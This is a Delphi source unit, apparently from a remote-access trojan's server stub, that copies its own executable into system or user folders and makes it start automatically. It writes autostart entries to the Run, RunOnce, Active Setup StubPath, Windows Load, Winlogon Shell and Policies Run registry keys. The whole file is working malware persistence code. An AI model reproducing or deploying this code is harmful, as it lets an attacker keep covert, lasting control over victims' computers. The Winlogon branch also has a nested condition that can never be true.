Unit UnitInstallServer;

interface

uses
  windows,
  UnitConfigs,
  Functions;

procedure RestartServer(Server: pWideChar; Config: TConfiguracoes);
function CopyServer(Server: pWideChar; Config: TConfiguracoes): pWideChar;

const
  SoftRun = 'Software\Microsoft\Windows\CurrentVersion\Run';
  RunOnce = 'Software\Microsoft\Windows\CurrentVersion\RunOnce';
  WinLoad = 'Software\Microsoft\Windows NT\CurrentVersion\Windows';
  WinShell = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon';
  Policies = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';

  InstallComp = 'Software\Microsoft\Active Setup\Installed Components\';
  Barrinha = '\';

implementation
function IsWinXP: Boolean;
var
  osv: TOSVERSIONINFO;
begin
  osv.dwOSVersionInfoSize := sizeOf(OSVERSIONINFO);
  GetVersionEx(osv);
  //   result := ( osv.dwPlatformId = VER_PLATFORM_WIN32_NT );
  Result := (osv.dwMajorVersion > 5) or ((osv.dwMajorVersion = 5) and
    (osv.dwMinorVersion >= 1));
end;


function CopyServer(Server: pWideChar; Config: TConfiguracoes): pWideChar;
var
  FolderName: pWideChar;
  FileName: pWideChar;
begin
  result := Server;
  if Config.CopyServer = false then exit;

  if Config.SelectedDir = 0 then FolderName := MyWindowsFolder else
  if Config.SelectedDir = 1 then FolderName := MySystemFolder else
  if Config.SelectedDir = 2 then FolderName := MyRootFolder else
  if Config.SelectedDir = 3 then
  begin
    if GetProgramFilesDir <> nil then
    FolderName := SomarpWideChar(GetProgramFilesDir, '\') else
    begin
      FolderName := GetAppDataDir;
      FolderName := SomarpWideChar(FolderName, '\');
    end;
  end else
  if Config.SelectedDir = 4 then
  begin
    FolderName := GetAppDataDir;
    FolderName := SomarpWideChar(FolderName, '\');
  end else
  if Config.SelectedDir = 5 then FolderName := MyTempFolder;

  if Config.ServerFolder <> '' then
  begin
    FolderName := SomarpWideChar(FolderName, Config.ServerFolder);
    FolderName := SomarpWideChar(FolderName, '\');
  end;

  if ComparePointer(Server, SomarpWideChar(FolderName, Config.ServerFileName), StrLen(Server) * 2) = True then Exit;
  if ForceDirectories(FolderName) = False then Exit;

  SetFileAttributesW(SomarpWideChar(FolderName, Config.ServerFileName), FILE_ATTRIBUTE_NORMAL);
  if CopyFileW(Server, SomarpWideChar(FolderName, Config.ServerFileName), False) = false then
  begin
    FolderName := GetAppDataDir;
    FolderName := SomarpWideChar(FolderName, '\');

    if Config.ServerFolder <> '' then
    begin
      FolderName := SomarpWideChar(FolderName, Config.ServerFolder);
      FolderName := SomarpWideChar(FolderName, '\');
    end;
    if ForceDirectories(FolderName) = False then Exit;

    SetFileAttributesW(SomarpWideChar(FolderName, Config.ServerFileName), FILE_ATTRIBUTE_NORMAL);
    if CopyFileW(Server, SomarpWideChar(FolderName, Config.ServerFileName), False) = false then Exit else
    result := SomarpWideChar(FolderName, Config.ServerFileName);
  end else
  result := SomarpWideChar(FolderName, Config.ServerFileName);
end;

procedure RestartServer(Server: pWideChar; Config: TConfiguracoes);
var
  TempKey, TempSubKey: pWideChar;
  Key: HKEY;
begin
  if Config.Restart = False then exit;

  if Config.HKLMRunBool = true then
  Write2Reg(HKEY_LOCAL_MACHINE, SoftRun, Config.HKLMRun, Server);

  if Config.HKCURunBool = true then
  Write2Reg(HKEY_CURRENT_USER, SoftRun, Config.HKCURun, Server);

  if Config.ActiveXBool = true then
  begin
    DeletarChave(HKEY_CURRENT_USER, SomarpWideChar(InstallComp, Config.ActiveX));
    Write2Reg(HKEY_LOCAL_MACHINE, SomarpWideChar(InstallComp, Config.ActiveX), 'StubPath', SomarpWideChar(Server, ' restart'));
  end;

  if Config.MoreStartUp = False then Exit;

  if Config.RunOnceBool = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, RunOnce, Config.MoreStartUpName, Server);
    Write2Reg(HKEY_CURRENT_USER, RunOnce, Config.MoreStartUpName, Server);
  end;

  if Config.WinLoadBool = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinLoad, 'Load', Server);
    Write2Reg(HKEY_CURRENT_USER, WinLoad, 'Load', Server);
  end;

  if Config.WinShellBool = true then
  begin
   if IsWinXP = false then
   begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinShell, 'Shell', pWideChar( server));
    Write2Reg(HKEY_CURRENT_USER, WinShell, 'Shell', pWideChar( server));
    if IsWinXP = true then
   begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinShell, 'Shell', SomarpWideChar('explorer.exe ', server));
    Write2Reg(HKEY_CURRENT_USER, WinShell, 'Shell', SomarpWideChar('explorer.exe ', server))
   end;
  end;
  end;

  if Config.RunPolicies = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, Policies, Config.MoreStartUpName, Server);
    Write2Reg(HKEY_CURRENT_USER, Policies, Config.MoreStartUpName, Server);
  end;

end;

end.